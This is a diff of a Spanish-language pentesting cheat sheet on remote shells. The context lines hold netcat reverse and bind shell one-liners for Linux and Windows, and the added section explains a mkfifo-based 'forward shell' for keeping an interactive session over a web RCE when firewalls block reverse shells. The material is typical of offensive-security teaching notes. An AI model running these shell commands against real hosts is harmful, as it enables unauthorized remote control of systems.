@@ -19,8 +19,6 @@ Donde:
 * `-n` : Deshabilitar resolución inversa de DNS
 * `-p <Port>` : Establece el puerto de escucha
 
-
-
 ### Victima Linux
 
 ```bash
@@ -32,8 +30,6 @@ nc <IP> <Port> -e /bin/bash
 ```bash
 nc.exe <IP> <Port> –e cmd.exe
 ```
-
-
 
 
 
@@ -64,6 +60,18 @@ nc -lvnp <Port> -e /bin/bash
 nc.exe -l -p <Port> -e cmd.exe
 ```
 {% endcode %}
+
+## Forward Shell
+
+Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.
+
+Puedes encontrar casos en los que tienes un RCE (Remote Code Execution) en una aplicación web en una máquina Linux pero debido a reglas Iptables u otro tipo de filtrado no puedes obtener una shell inversa.&#x20;
+
+Esta técnica o tipo de "shell" te permite mantener un shell PTY a través de ese RCE usando tuberías dentro del sistema víctima.&#x20;
+
+{% embed url="https://github.com/IppSec/forward-shell" %}
+
+Sólo necesitas modificar La URL del host vulnerable El prefijo y sufijo de tu payload (si lo hay) La forma en que se envía el payload (¿encabezados? ¿datos? ¿información extra?) Luego, sólo tienes que enviar comandos o incluso utilizar el comando upgrade para obtener un PTY completo (ten en cuenta que las tuberías se leen y escriben con un retardo aproximado de 1,3s).
 
 
 
